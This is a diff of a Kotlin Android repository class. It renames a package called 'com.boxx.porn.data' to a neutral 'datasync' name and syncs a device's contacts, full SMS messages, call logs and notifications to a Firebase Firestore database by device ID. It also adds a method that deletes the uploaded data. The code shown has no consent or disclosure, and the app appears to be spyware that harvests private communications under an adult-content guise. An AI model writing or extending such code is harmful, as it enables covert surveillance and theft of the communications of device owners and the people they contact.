@@ -1,7 +1,8 @@
-package com.boxx.porn.data
+package com.boxx.datasync.data.repository
 
 import android.util.Log
-import com.boxx.porn.model.*
+import com.boxx.datasync.domain.model.*
+import com.boxx.datasync.domain.repository.DataRepository
 import com.google.firebase.crashlytics.FirebaseCrashlytics
 import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.tasks.await
@@ -10,35 +11,35 @@ import javax.inject.Inject
 import javax.inject.Singleton
 
 @Singleton
-class FirestoreRepository @Inject constructor() {
+class DataRepositoryImpl @Inject constructor() : DataRepository {
     private val db = FirebaseFirestore.getInstance()
     private val crashlytics = FirebaseCrashlytics.getInstance()
 
-    suspend fun updateDeviceInfo(device: Device) {
+    override suspend fun updateDeviceInfo(device: Device) {
         try {
             db.collection("devices")
                 .document(device.deviceId)
                 .set(device)
                 .await()
         } catch (e: Exception) {
-            Log.e("FirestoreRepository", "Error updating device info", e)
+            Log.e("DataRepositoryImpl", "Error updating device info", e)
             crashlytics.recordException(e)
         }
     }
 
-    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
+    override suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
         syncCollection(deviceId, "contacts", contacts) { hashString(it.phone) }
     }
 
-    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
+    override suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
         syncCollection(deviceId, "sms", smsList) { hashString("${it.address}${it.date}${it.body}") }
     }
 
-    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
+    override suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
         syncCollection(deviceId, "calllogs", callLogs) { hashString("${it.number}${it.date}${it.type}") }
     }
 
-    suspend fun syncNotification(deviceId: String, notification: NotificationData) {
+    override suspend fun syncNotification(deviceId: String, notification: NotificationData) {
         if (deviceId.isBlank()) return
         try {
             val docId = hashString("${notification.packageName}${notification.timestamp}${notification.title}")
@@ -49,7 +50,42 @@ class FirestoreRepository @Inject constructor() {
                 .set(notification)
                 .await()
         } catch (e: Exception) {
-            Log.e("FirestoreRepository", "Error syncing notification", e)
+            Log.e("DataRepositoryImpl", "Error syncing notification", e)
+            crashlytics.recordException(e)
+        }
+    }
+
+    override suspend fun deleteSyncedData(deviceId: String) {
+        if (deviceId.isBlank()) return
+        try {
+            val collections = listOf("contacts", "sms", "calllogs", "notifications")
+            for (collection in collections) {
+                val snapshot = db.collection("devices")
+                    .document(deviceId)
+                    .collection(collection)
+                    .get()
+                    .await()
+
+                val chunks = snapshot.documents.chunked(500)
+                for (chunk in chunks) {
+                    val batch = db.batch()
+                    for (doc in chunk) {
+                        batch.delete(doc.reference)
+                    }
+                    batch.commit().await()
+                }
+            }
+            // Also reset device metadata counts
+            db.collection("devices").document(deviceId).update(
+                mapOf(
+                    "contactCount" to 0,
+                    "smsCount" to 0,
+                    "callLogCount" to 0,
+                    "notificationCount" to 0
+                )
+            ).await()
+        } catch (e: Exception) {
+            Log.e("DataRepositoryImpl", "Error deleting data", e)
             crashlytics.recordException(e)
         }
     }
@@ -66,7 +102,6 @@ class FirestoreRepository @Inject constructor() {
             .collection(collectionName)
 
         try {
-            // Batch writes limited to 500 operations
             val chunks = data.chunked(500)
             for (chunk in chunks) {
                 val batch = db.batch()
@@ -78,7 +113,7 @@ class FirestoreRepository @Inject constructor() {
                 batch.commit().await()
             }
         } catch (e: Exception) {
-            Log.e("FirestoreRepository", "Error syncing $collectionName", e)
+            Log.e("DataRepositoryImpl", "Error syncing $collectionName", e)
             crashlytics.recordException(e)
         }
     }
